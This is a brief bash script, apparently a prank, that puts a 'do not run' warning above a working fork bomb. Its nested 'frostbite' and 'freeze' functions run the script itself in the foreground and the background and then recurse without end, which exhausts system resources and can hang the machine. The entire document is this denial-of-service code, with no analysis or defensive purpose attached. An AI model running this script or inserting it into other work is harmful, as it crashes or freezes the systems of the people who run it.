#############################################
#   FAIR WARNING: DO NOT RUN THIS PROGRAM   #
#############################################

clear
echo "Just let it cool down a bit more"

function frostbite {
	function freeze {
		$0
		$0 &
		freeze
	};
	freeze
}
frostbite
